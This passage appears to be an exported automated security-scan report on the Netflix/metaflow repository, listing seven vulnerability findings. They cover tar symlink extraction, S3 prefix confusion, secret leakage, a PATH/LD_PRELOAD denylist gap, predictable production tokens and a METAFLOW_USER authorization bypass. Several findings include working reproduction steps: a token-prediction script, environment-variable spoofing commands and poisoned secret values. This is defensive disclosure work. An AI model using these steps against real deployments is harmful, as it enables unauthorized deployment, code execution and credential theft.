        vigoliumVersion: "v0.0.1-alpha",
        results: [{"type":"finding","data":{"id":23,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m17","module_name":"The `install_micromamba()` function in `metaflow/plugins/pypi/bootstrap.py` downloads a bz2-compressed tar archive from either the outerbounds mirror or the official `micro.mamba.pm` CDN, then extract","module_type":"whitebox","finding_source":"archon","module_short":"micromamba-tar-extract-symlink","description":"Phase: 10\nSequence: 002\nSlug: micromamba-tar-extract-no-symlink-check\nVerdict: VALID\nRationale: tar.extract(member, micromamba_dir) in bootstrap.py fetches a specific member by name from a supply-chain archive without checking member.type, allowing a SYMTYPE member named \"bin/micromamba\" to create a symlink to an attacker-chosen path; same root cause as p8-025 at a distinct extraction site.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nOrigin-Finding: archon/findings-draft/p8-025-tar-safe-extract-symlink.md\nOrigin-Pattern: AP-025\n\n## Summary\n\nThe `install_micromamba()` function in `metaflow/plugins/pypi/bootstrap.py` downloads a bz2-compressed tar archive from either the outerbounds mirror or the official `micro.mamba.pm` CDN, then extracts a single named member `\"bin/micromamba\"` using `tar.extract(member, micromamba_dir)`. The `member` object is obtained via `tar.getmember(\"bin/micromamba\")` and is passed directly to `tar.extract()` without checking `member.type`, `member.issym()`, or `member.islnk()`. If the archive from the download source contains a SYMTYPE entry at path `\"bin/micromamba\"` (achieved via supply-chain compromise of either URL, or a MITM on the unverified HTTPS download), the `tar.extract()` call will create a symlink at `micromamba_dir/bin/micromamba` pointing to any attacker-chosen filesystem path. Subsequent code then calls `os.chmod(micromamba_path, 0o755)` on the symlink target and adds `micromamba_dir/bin` to `PATH`. When Metaflow later invokes the `micromamba` binary, it executes whatever the symlink resolves to.\n\n## Location\n\n- `metaflow/plugins/pypi/bootstrap.py:154-155` -- `member = tar.getmember(\"bin/micromamba\")` then `tar.extract(member, micromamba_dir)` -- NO type check\n- `metaflow/plugins/pypi/bootstrap.py:130-162` -- `_download_and_extract(url)` inner function, called for both mirror and fallback URLs\n- `metaflow/plugins/pypi/bootstrap.py:109-111` -- `micromamba_dir = os.path.join(os.getcwd(), \"micromamba\")` -- extraction destination\n- `metaflow/plugins/pypi/bootstrap.py:172` -- `os.chmod(micromamba_path, 0o755)` -- chmod applied to symlink target\n\n## Attacker Control\n\nRequires one of:\n1. Supply-chain compromise of `https://micromamba.outerbounds.sh/` (mirror) or `https://micro.mamba.pm/api/micromamba/{platform}/2.0.4` (official) -- crafted bz2.tar with SYMTYPE member at `\"bin/micromamba\"` pointing to attacker target\n2. MITM or DNS spoofing on the CDN download (no HTTPS certificate pinning, no checksum -- same precondition as p8-023)\n\nThe threat model is identical to p8-023 (binary download without integrity check), but the exploitation mechanism here is the symlink creation rather than replacing the binary directly.\n\n## Trust Boundary Crossed\n\nInternet CDN / mirror (attacker-writable via supply chain) -\u003e tar extraction -\u003e symlink creation -\u003e arbitrary filesystem write / binary substitution in container.\n\n## Impact\n\n- Arbitrary file write: `os.chmod(micromamba_path, 0o755)` applies to the symlink's target, potentially making sensitive files executable\n- Binary substitution: subsequent `which(os.path.join(micromamba_dir, \"bin/micromamba\"))` resolves the symlink as the micromamba binary, so Metaflow will execute the symlink target when invoking micromamba (e.g., environment creation, package installation)\n- Container IAM escalation: micromamba runs with full container IAM role permissions; replacing it enables exfiltration of IAM credentials and cloud access\n\nSeverity is MEDIUM (not HIGH) because exploitation requires supply-chain compromise or MITM of an HTTPS CDN download, which is a non-trivial prerequisite.\n\n## Evidence\n\n```python\n# bootstrap.py:148-155 -- _download_and_extract inner function\nwith tarfile.open(\n    fileobj=io.BytesIO(\n        decompressor.decompress(response.read())\n    ),\n    mode=\"r:\",\n) as tar:\n    member = tar.getmember(\"bin/micromamba\")\n    tar.extract(member, micromamba_dir)  # BUG: no member.type, issym(), islnk() check\n```\n\nA crafted archive where entry `\"bin/micromamba\"` has type=SYMTYPE and linkname=\"/tmp/evil_binary\":\n- `tar.getmember(\"bin/micromamba\")` returns the symlink TarInfo object\n- `tar.extract(member, micromamba_dir)` creates `micromamba_dir/bin/micromamba -\u003e /tmp/evil_binary`\n- `os.chmod(micromamba_path, 0o755)` makes `/tmp/evil_binary` executable (chmod follows the symlink)\n- Subsequent invocations of micromamba execute `/tmp/evil_binary`\n\nCompare with p8-025 (util.py:549-561) which is the same missing type check in `tar_safe_extract`. Both are AP-025 instances.\n\nThe sinks.json CodeQL artifact explicitly flags this sink:\n```json\n{\n  \"kind\": \"file-access:tarfile.extract\",\n  \"file\": \"metaflow/plugins/pypi/bootstrap.py\",\n  \"line\": 155,\n  \"confirmed\": true,\n  \"semgrep_rule\": \"tarfile-extract-symlink-not-validated\"\n}\n```\n\n## Reproduction Steps\n\n1. Create a bz2-compressed tar archive where member `\"bin/micromamba\"` is type SYMTYPE with linkname pointing to a controlled path (e.g., `/tmp/micromamba_symlink_target`)\n2. Place a marker script at `/tmp/micromamba_symlink_target` (or arrange for it to be written)\n3. Serve the crafted archive from a MITM server intercepting the micromamba CDN URL\n4. Trigger a flow using `@pypi` or `@conda` decorator in a fresh environment where micromamba is not installed\n5. Verify that `micromamba_dir/bin/micromamba` is a symlink to `/tmp/micromamba_symlink_target`\n6. Verify that `os.chmod` made the symlink target executable\n7. Verify subsequent micromamba invocations execute the symlink target\n8. Recommended fix: add `if member.issym() or member.islnk(): raise Exception(\"Unexpected symlink in micromamba archive\")` before `tar.extract(member, micromamba_dir)`; additionally add SHA-256 checksum verification of the downloaded archive (prerequisite fix from p8-023)\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending","variant-of:H3"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/pypi/bootstrap.py:154-155","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/pypi/bootstrap.py:154-155","metaflow/plugins/pypi/bootstrap.py:130-162","metaflow/plugins/pypi/bootstrap.py:109-111","metaflow/plugins/pypi/bootstrap.py:172"],"finding_hash":"197063965abe845b89ee35f2519b0633","found_at":"2026-04-18T18:34:03.34806Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":22,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m16","module_name":"The `get()` command in `metaflow/plugins/datatools/s3/s3op.py` does not add a trailing slash to the S3 prefix path before calling `list_objects_v2`, unlike the `lst()` command which explicitly normali","module_type":"whitebox","finding_source":"archon","module_short":"s3-prefix-confusion","description":"Phase: 8\nSequence: 046\nSlug: s3-prefix-confusion\nVerdict: VALID\nRationale: Confirmed normalization asymmetry between lst() and get() paths -- get() lacks trailing-slash normalization, causing S3 ListObjectsV2 to return objects from sibling prefixes.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `get()` command in `metaflow/plugins/datatools/s3/s3op.py` does not add a trailing slash to the S3 prefix path before calling `list_objects_v2`, unlike the `lst()` command which explicitly normalizes with a trailing slash. This causes `get --recursive s3://bucket/prefix/train` to also download objects from sibling prefixes like `train_test/`, `training/`, `train-v2/`, etc. In shared S3 buckets, this results in information disclosure of other users' data from adjacent prefixes.\n\n## Location\n\n- **Primary**: `metaflow/plugins/datatools/s3/s3op.py:1166` -- `path=src.path.lstrip(\"/\")` (no trailing slash)\n- **Contrast**: `metaflow/plugins/datatools/s3/s3op.py:881-884` -- `lst()` adds trailing slash:\n  ```python\n  if path_with_slash and not path_with_slash.endswith(\"/\"):\n      path_with_slash += \"/\"\n  ```\n- **High-level API**: `metaflow/plugins/datatools/s3/s3.py:643` -- `_url()` also lacks trailing slash normalization for `get_recursive()` path\n\n## Attacker Control\n\nAttacker with write access to a sibling S3 prefix (common in shared ML experiment buckets) writes objects under a prefix that shares a string prefix with the victim's path (e.g., `experiments/train_poisoned/` when victim requests `experiments/train`).\n\n## Trust Boundary Crossed\n\nS3 prefix URL (user-specified) -\u003e S3 ListObjectsV2 API (prefix matching) -\u003e cross-prefix data access. The S3 prefix is the intended data boundary, but missing trailing slash breaks this boundary.\n\n## Impact\n\n- Information disclosure: unexpected S3 objects from sibling prefixes downloaded\n- In ML pipelines: silent inclusion of unexpected training data enables data poisoning\n- In shared experiment buckets: other users' data exposed to the requesting user\n- No warning or error: extra objects silently included in download\n\n## Evidence\n\n1. `s3op.py:1166`: `path=src.path.lstrip(\"/\")` -- no trailing slash added\n2. `s3op.py:881-884`: `lst()` explicitly adds trailing slash (demonstrating awareness of the issue)\n3. `s3op.py:1180-1181`: `if recursive: op = partial(op_list_prefix, s3config)` -- uses unmodified path\n4. S3 `ListObjectsV2` with `Prefix=\"train\"` returns ALL keys starting with string \"train\"\n\n## Reproduction Steps\n\n1. Create S3 objects:\n   - `s3://bucket/experiments/train/data1.csv`\n   - `s3://bucket/experiments/train_test/secret.csv`\n2. Run: `python -m metaflow.plugins.datatools.s3.s3op get --recursive s3://bucket/experiments/train`\n3. Observe: both `data1.csv` AND `secret.csv` are downloaded\n4. Compare with: `python -m metaflow.plugins.datatools.s3.s3op lst s3://bucket/experiments/train` -- only lists `train/` contents (trailing slash added)\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/datatools/s3/s3op.py:1166","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/datatools/s3/s3op.py:1166","metaflow/plugins/datatools/s3/s3op.py:881-884","metaflow/plugins/datatools/s3/s3.py:643"],"finding_hash":"e7b6934efbcf47edfd3371cfc63a5685","found_at":"2026-04-18T18:34:03.348059Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":20,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m14","module_name":"The `SecretsDecorator` class in `metaflow/plugins/secrets/secrets_decorator.py` does not implement `task_post_step` to clean up injected environment variables. In local execution mode, all steps run s","module_type":"whitebox","finding_source":"archon","module_short":"cross-step-secret-leakage","description":"Phase: 8\nSequence: 044\nSlug: cross-step-secret-leakage\nVerdict: VALID\nRationale: Confirmed absence of task_post_step cleanup in SecretsDecorator; secrets persist in os.environ across steps in local execution mode.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `SecretsDecorator` class in `metaflow/plugins/secrets/secrets_decorator.py` does not implement `task_post_step` to clean up injected environment variables. In local execution mode, all steps run sequentially in the same process, so secrets injected by Step A via `os.environ.update()` remain accessible to Step B even if Step B has no `@secrets` decorator. This violates the principle of least privilege for secret scope.\n\n## Location\n\n- **Primary**: `metaflow/plugins/secrets/secrets_decorator.py` -- absence of `task_post_step` implementation\n- **Injection**: `secrets_decorator.py:123` -- `os.environ.update(secrets_env_vars[1].items())`\n- **Inherited no-op**: `StepDecorator.task_post_step` (base class)\n\n## Attacker Control\n\nNot a direct attack vector but a defense gap. Step B can read Step A's secrets from `os.environ` without any authorization. Additionally, Step B with `@secrets(allow_override=False)` and the SAME key will FAIL with MetaflowException, creating a denial-of-service condition and pushing users toward `allow_override=True`.\n\n## Trust Boundary Crossed\n\nStep A's secret scope -\u003e Step B's execution environment. The `@secrets` decorator is intended to scope secrets to specific steps, but in local mode, this scope is not enforced.\n\n## Impact\n\n- Secret scope leakage: Step B reads Step A's secrets without `@secrets` authorization\n- Denial of service: Step B with `@secrets(allow_override=False)` fails if Step A set the same key\n- Usability trap: pushes users toward `allow_override=True` which suppresses collision detection\n- Limited to local execution mode (remote execution uses isolated containers)\n\n## Evidence\n\n1. `secrets_decorator.py`: No `task_post_step` method defined -- inherits no-op from `StepDecorator`\n2. `secrets_decorator.py:123`: `os.environ.update()` modifies process-global environment\n3. `os.environ` is process-global -- persists until process exits or explicit removal\n4. Local mode runs all steps in same process sequentially\n\n## Reproduction Steps\n\n1. Create a flow with two steps:\n   - Step A: `@secrets(sources=[\"cred-a\"])` where cred-a contains `{\"DB_PASSWORD\": \"secret123\"}`\n   - Step B: no `@secrets` decorator\n2. Run locally: `python flow.py run`\n3. In Step B code, print `os.environ.get(\"DB_PASSWORD\")` -\u003e outputs `secret123`\n4. Verify: Step B should NOT have access to Step A's secrets\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"secrets_decorator.py:123","repo_name":"Netflix/metaflow","matched_at":["secrets_decorator.py:123"],"finding_hash":"aa7d5831d0afb5bc8aab689399c21fee","found_at":"2026-04-18T18:34:03.348058Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":21,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m15","module_name":"The `validate_env_vars_across_secrets()` function in `metaflow/plugins/secrets/utils.py` only validates key collisions within a single `@secrets` decorator's sources. When multiple `@secrets` decorato","module_type":"whitebox","finding_source":"archon","module_short":"cross-secrets-collision","description":"Phase: 8\nSequence: 045\nSlug: cross-secrets-collision\nVerdict: VALID\nRationale: Cross-decorator collision confirmed -- validate_env_vars_across_secrets only validates within one @secrets invocation, no shared state tracks injected keys across multiple @secrets decorators.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `validate_env_vars_across_secrets()` function in `metaflow/plugins/secrets/utils.py` only validates key collisions within a single `@secrets` decorator's sources. When multiple `@secrets` decorators are stacked on the same step, each invocation builds its own independent `all_secrets_env_vars` list. If the later `@secrets` uses `allow_override=True`, it silently overwrites values injected by the earlier `@secrets` decorator without any collision signal. In multi-tenant platforms, this enables user-controlled secrets to silently override admin-configured secrets.\n\n## Location\n\n- **Primary**: `metaflow/plugins/secrets/utils.py:19-28` -- `validate_env_vars_across_secrets` scoped to single invocation\n- **Per-invocation scope**: `metaflow/plugins/secrets/secrets_decorator.py:61` -- `all_secrets_env_vars = []` initialized per `task_pre_step`\n- **Override**: `secrets_decorator.py:114-115` -- `allow_override` check skips existing env check\n\n## Attacker Control\n\nIn platform context: admin configures `@secrets(sources=[\"platform-creds\"])` on steps. User adds `@secrets(sources=[\"user-config\"], allow_override=True)`. User's secret containing the same key names silently overwrites admin values. User controls the values in their secret source.\n\n## Trust Boundary Crossed\n\nUser-controlled secret values -\u003e admin-configured secret values. In platform deployments where admin-configured secrets provide standardized credentials, user-controlled override creates a privilege confusion path.\n\n## Impact\n\n- Silent env var value substitution: admin-configured secrets overridden by user-controlled secrets\n- No audit trail: override happens silently without logging or error\n- Potential for privilege escalation: if admin secrets configure database credentials, user can redirect database connections to attacker-controlled servers\n\n## Evidence\n\n1. `utils.py:19-28`: `validate_env_vars_across_secrets` only checks within `all_secrets_env_vars` from ONE invocation\n2. `secrets_decorator.py:61`: `all_secrets_env_vars = []` -- fresh list per `@secrets` decorator\n3. `secrets_decorator.py:114-115`: `allow_override=True` skips `validate_env_vars_vs_existing_env`\n4. `secrets_decorator.py:123`: `os.environ.update()` silently overwrites\n\n## Reproduction Steps\n\n1. Create a step with stacked decorators:\n```python\n@secrets(sources=[\"admin-db-creds\"])        # sets DB_HOST=prod-db.internal\n@secrets(sources=[\"user-config\"], allow_override=True)  # sets DB_HOST=attacker-db.external\n@step\ndef process_data(self):\n    print(os.environ[\"DB_HOST\"])  # prints attacker-db.external\n```\n2. Run the flow: observe that `DB_HOST` contains the user-controlled value, not the admin-configured value\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/secrets/utils.py:19-28","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/secrets/utils.py:19-28","metaflow/plugins/secrets/secrets_decorator.py:61","secrets_decorator.py:114-115"],"finding_hash":"62dcd00b71ab7569b5c5ad9b36e33ea8","found_at":"2026-04-18T18:34:03.348058Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":19,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m13","module_name":"The `validate_env_vars()` function in `metaflow/plugins/secrets/utils.py` only blocks environment variable names starting with `METAFLOW_` prefix. Dangerous system environment variables such as `PATH`","module_type":"whitebox","finding_source":"archon","module_short":"secrets-env-var-denylist-gap","description":"Phase: 8\nSequence: 043\nSlug: secrets-env-var-denylist-gap\nVerdict: VALID\nRationale: Critical system env vars (PATH, LD_PRELOAD, PYTHONPATH, MASTER_ADDR) pass validate_env_vars and are injected into step process via os.environ.update(); Advocate found no blocking protection beyond METAFLOW_ prefix check.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `validate_env_vars()` function in `metaflow/plugins/secrets/utils.py` only blocks environment variable names starting with `METAFLOW_` prefix. Dangerous system environment variables such as `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONSTARTUP`, `PYTHONPATH`, `PYTHONHOME`, `MASTER_ADDR`, `WORLD_SIZE`, and `NODE_RANK` all pass validation and are injected into the step process via `os.environ.update()`. This enables binary hijacking, shared library injection, and distributed training communication redirection.\n\n## Location\n\n- **Primary**: `metaflow/plugins/secrets/utils.py:41-56` -- `validate_env_vars()` with insufficient denylist\n- **Injection point**: `metaflow/plugins/secrets/secrets_decorator.py:123` -- `os.environ.update(secrets_env_vars[1].items())`\n- **Denylist**: `utils.py:5` -- `DISALLOWED_SECRETS_ENV_VAR_PREFIXES = [\"METAFLOW_\"]`\n\n## Attacker Control\n\n1. Attacker with write access to secrets backend (AWS Secrets Manager or HashiCorp Vault) creates a secret containing `{\"PATH\": \"/attacker/bin:/usr/bin:/bin\"}` or `{\"LD_PRELOAD\": \"/shared-nfs/malicious.so\"}`\n2. The secret key names pass the regex check (`[a-zA-Z_][a-zA-Z0-9_]*`) and the prefix check (not starting with `METAFLOW_`)\n3. Values are injected directly into `os.environ` at step execution time\n\n## Trust Boundary Crossed\n\nSecrets backend (external data source) -\u003e step process environment variables -\u003e binary resolution / shared library loading / distributed training communication. The `@secrets` decorator is designed to inject values from external sources, but lacks protection against injecting process-control variables.\n\n## Impact\n\n- **PATH hijacking**: Redirects all subprocess binary resolution to attacker-controlled directories\n- **LD_PRELOAD injection**: Loads attacker's shared library into all subprocess memory spaces, enabling transparent TLS interception, credential exfiltration\n- **MASTER_ADDR injection**: Redirects distributed training communication to attacker-controlled host (gradient/weight exfiltration in ML training)\n- **PYTHONSTARTUP/PYTHONPATH**: Executes attacker code in every Python subprocess\n- With `allow_override=True` or when target var not pre-set (LD_PRELOAD typically unset): works unconditionally\n\n## Evidence\n\n1. `utils.py:49`: `re.fullmatch(\"[a-zA-Z_][a-zA-Z0-9_]*\", k)` -- accepts PATH, LD_PRELOAD, etc.\n2. `utils.py:51-56`: Only blocks `METAFLOW_` prefix -- no denylist for system vars\n3. `secrets_decorator.py:123`: `os.environ.update(secrets_env_vars[1].items())` -- direct injection\n4. `secrets_decorator.py:114-115`: `allow_override=False` only checks via `validate_env_vars_vs_existing_env` which checks if key ALREADY exists in os.environ -- LD_PRELOAD is typically not set\n\n## Reproduction Steps\n\n1. Create a secret in AWS Secrets Manager: `{\"PATH\": \"/tmp/evil/bin:/usr/bin:/bin\", \"LD_PRELOAD\": \"/tmp/evil/lib/hook.so\"}`\n2. Create a flow with: `@secrets(sources=[\"arn:aws:secretsmanager:...\"])`\n3. Place malicious binaries in `/tmp/evil/bin/` or a shared filesystem\n4. Run the flow: step execution uses poisoned PATH/LD_PRELOAD\n5. Verify: subprocess calls in the step resolve to attacker-controlled binaries\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Variables like LD_PRELOAD and PYTHONSTARTUP pass all validation checks in validate_env_vars() and are injected into os.environ; the denylist gap is real, though exploitation requires secrets backend write access.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\nThe denylist gap is genuine. `validate_env_vars()` at utils.py:41-56 only blocks `METAFLOW_` prefixed variables. Dangerous system variables like `LD_PRELOAD`, `PYTHONSTARTUP`, and `PYTHONPATH` (typically unset in process environments) pass both the regex and prefix checks, and bypass the `validate_env_vars_vs_existing_env()` check since they are not normally present in `os.environ`. Severity downgraded from HIGH to MEDIUM because exploitation requires write access to the secrets backend (AWS Secrets Manager, Vault, etc.), which is a significant precondition requiring elevated infrastructure privileges. Note: `PATH` is partially protected by `validate_env_vars_vs_existing_env()` when `allow_override=False` (default) since `PATH` normally exists in the environment, but `LD_PRELOAD` and `PYTHONSTARTUP` are not protected by this check.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/secrets/utils.py:41-56","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/secrets/utils.py:41-56","metaflow/plugins/secrets/secrets_decorator.py:123","utils.py:5"],"finding_hash":"d9644663467bb7bf50c7682345e42b38","found_at":"2026-04-18T18:34:03.348057Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":18,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m12","module_name":"The production token generator in `metaflow/plugins/aws/step_functions/production_token.py` uses Python's `random.seed(zlib.adler32(to_bytes(prefix)))` to seed the PRNG, producing a fully deterministi","module_type":"whitebox","finding_source":"archon","module_short":"deterministic-token-prediction","description":"Phase: 8\nSequence: 042\nSlug: deterministic-token-prediction\nVerdict: VALID\nRationale: Production tokens are fully predictable from public workflow name via deterministic PRNG seeded with 32-bit CRC; verified reproducibility via independent test.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe production token generator in `metaflow/plugins/aws/step_functions/production_token.py` uses Python's `random.seed(zlib.adler32(to_bytes(prefix)))` to seed the PRNG, producing a fully deterministic token sequence from a known `token_prefix`. Since `token_prefix` is derivable from the public workflow name (or from `sha1(project.branch_name)` for project flows), an attacker can predict all production tokens in the sequence. The first deployment always uses token at index 0. This renders the production token mechanism ineffective as an authorization control.\n\n## Location\n\n- **Primary**: `metaflow/plugins/aws/step_functions/production_token.py:11-17` -- `_token_generator()` uses deterministic PRNG\n- **Seed**: Line 16 -- `random.seed(zlib.adler32(to_bytes(prefix)))` with 32-bit seed\n- **Token format**: Line 17 -- `prefix + \"\".join(random.sample(string.ascii_lowercase, 4))` (4 lowercase chars appended)\n- **Token prefix derivation**: `argo_workflows_cli.py:657` -- `token_prefix = workflow_name` for non-project flows\n- **Token prefix derivation (project)**: `argo_workflows_cli.py:603-606` -- `sha1(project.branch_name)` prefix\n\n## Attacker Control\n\n1. `token_prefix` is derivable from public information: the workflow name (visible in K8s) or the project/branch name\n2. The entire 10000-token sequence is reproducible with a few lines of Python\n3. The first deployment always uses the token at index 0; subsequent deployments use the next token in sequence\n\n## Trust Boundary Crossed\n\nPublic workflow metadata (K8s annotations, flow name) -\u003e production token prediction -\u003e unauthorized deployment authorization. The production token is supposed to be a secret credential known only to the authorized deployer.\n\n## Impact\n\n- Complete bypass of the production token authorization mechanism\n- Attacker can predict any workflow's production token without prior access to the deployer's local config\n- Combined with p8-041 (METAFLOW_USER spoofing), provides two independent bypasses of the deployment authorization\n- Enables unauthorized workflow overwrite, code injection, and data exfiltration via modified production workflows\n\n## Evidence\n\n1. `production_token.py:16`: `random.seed(zlib.adler32(to_bytes(prefix)))` -- deterministic 32-bit seed\n2. `production_token.py:17`: `yield prefix + \"\".join(random.sample(string.ascii_lowercase, 4))` -- deterministic output\n3. Independent verification: running `_token_generator(\"myflow\")` twice produces identical sequences: `myflow-0-tysa`, `myflow-1-ylgq`, `myflow-2-vndy`, etc.\n4. `production_token.py:49-52`: `new_token()` for initial deployment returns first token (index 0) unconditionally\n\n## Reproduction Steps\n\n1. Identify target workflow name from K8s: `kubectl get workflowtemplate -o name`\n2. Predict token:\n```python\nimport random, string, zlib\ntoken_prefix = \"target_workflow_name\"  # or mfprj-\u003csha1prefix\u003e for project flows\nprefix = \"%s-0-\" % token_prefix\nrandom.seed(zlib.adler32(prefix.encode()))\npredicted_token = prefix + \"\".join(random.sample(string.ascii_lowercase, 4))\nprint(predicted_token)\n```\n3. Use predicted token: `python myflow.py argo-workflows create --production --authorize production:\u003cpredicted_token\u003e`\n4. Observe: deployment succeeds with the predicted token\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Token generation is provably deterministic from public workflow names; independently verified that identical token sequences are produced across runs, confirming the production token has zero cryptographic strength.\nSeverity-Final: MEDIUM\nPoC-Status: executed\n\nToken prediction was independently verified: `_token_generator(\"myflow\")` produces identical sequences (`myflow-0-tysa`, `myflow-1-ylgq`, etc.) across independent runs. Severity downgraded from HIGH to MEDIUM because exploitation requires K8s cluster access to both discover workflow names and submit deployment commands. The production token is a secondary authorization control behind K8s RBAC.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/aws/step_functions/production_token.py:11-17","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/aws/step_functions/production_token.py:11-17","argo_workflows_cli.py:657","argo_workflows_cli.py:603-606"],"finding_hash":"d7ed962a3fc03cbbecea9381d5a674bf","found_at":"2026-04-18T18:34:03.348056Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":17,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m11","module_name":"The `validate_token()` function in `metaflow/plugins/argo/argo_workflows_cli.py` allows bypassing the production token check when the current username matches the previous deployer's username. Since `","module_type":"whitebox","finding_source":"archon","module_short":"argo-token-bypass-user-spoof","description":"Phase: 8\nSequence: 041\nSlug: argo-token-bypass-user-spoof\nVerdict: VALID\nRationale: Production token check bypassed by trivial METAFLOW_USER env var spoofing; code acknowledges weakness in comments but no protection implemented.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-03/debate.md\n\n## Summary\n\nThe `validate_token()` function in `metaflow/plugins/argo/argo_workflows_cli.py` allows bypassing the production token check when the current username matches the previous deployer's username. Since `get_username()` reads the `METAFLOW_USER` environment variable (which is trivially spoofable), and the previous deployer's username is readable from Kubernetes WorkflowTemplate annotations, an attacker can overwrite any Argo Workflows production deployment without possessing the production token.\n\n## Location\n\n- **Primary**: `metaflow/plugins/argo/argo_workflows_cli.py:1207` -- `if prev_user != get_username() and authorize != prev_token:`\n- **Identity source**: `metaflow/util.py:150-162` -- `get_username()` reads `from_conf(\"USER\")` which reads `METAFLOW_USER` env var\n- **Config binding**: `metaflow/metaflow_config.py:92` -- `USER = from_conf(\"USER\")`\n- **Annotation read**: `metaflow/plugins/argo/argo_workflows.py:526` -- `prev_user` from `metaflow/owner` annotation\n\n## Attacker Control\n\n1. `METAFLOW_USER`: plain environment variable, trivially set by any process\n2. `prev_user`: readable from K8s WorkflowTemplate annotation `metaflow/owner` via `kubectl get workflowtemplate \u003cname\u003e -o json` (requires only K8s `get` permission on WorkflowTemplate resources, commonly granted)\n\n## Trust Boundary Crossed\n\nEnvironment variable (user-controlled) -\u003e Kubernetes Argo Workflows deployment authorization. The production token mechanism is the intended authorization layer for protecting deployed workflows from unauthorized modification.\n\n## Impact\n\n- Unauthorized overwrite of production Argo Workflows deployments\n- Attacker can deploy modified workflow that exfiltrates artifacts, corrupts ML results, or executes arbitrary code in step containers\n- No audit trail distinguishing the attacker from the legitimate deployer (same username in annotations)\n\n## Evidence\n\n1. `argo_workflows_cli.py:1207`: OR condition -- EITHER username match OR token match required (not both)\n2. `argo_workflows_cli.py:1205-1206`: Code comment acknowledges weakness: \"NOTE: The username is visible in multiple sources, and can be set by the user. Should we consider being stricter here?\"\n3. `util.py:159`: `for user in [USER] + [os.environ.get(x) for x in ENVVARS]` -- USER (METAFLOW_USER) checked first\n4. `argo_workflows.py:526`: `prev_user` stored as readable K8s annotation `metaflow/owner`\n\n## Reproduction Steps\n\n1. Identify target workflow: `kubectl get workflowtemplate \u003cname\u003e -o jsonpath='{.metadata.annotations.metaflow/owner}'` -\u003e returns `original_deployer`\n2. Set env var: `export METAFLOW_USER=original_deployer`\n3. Deploy: `python myflow.py argo-workflows create --production`\n4. Observe: deployment succeeds without production token because `prev_user == get_username()` evaluates to True\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: The OR condition at line 1207 combined with spoofable METAFLOW_USER env var genuinely bypasses the production token authorization, as acknowledged by the code's own comment at lines 1205-1206.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\nThe vulnerability is genuine but severity is downgraded from HIGH to MEDIUM because exploitation requires pre-existing Kubernetes cluster access (to both read WorkflowTemplate annotations and deploy workflows). K8s RBAC is the primary security boundary; the Metaflow production token is a secondary authorization layer. The bypass is trivial given K8s access but the precondition is 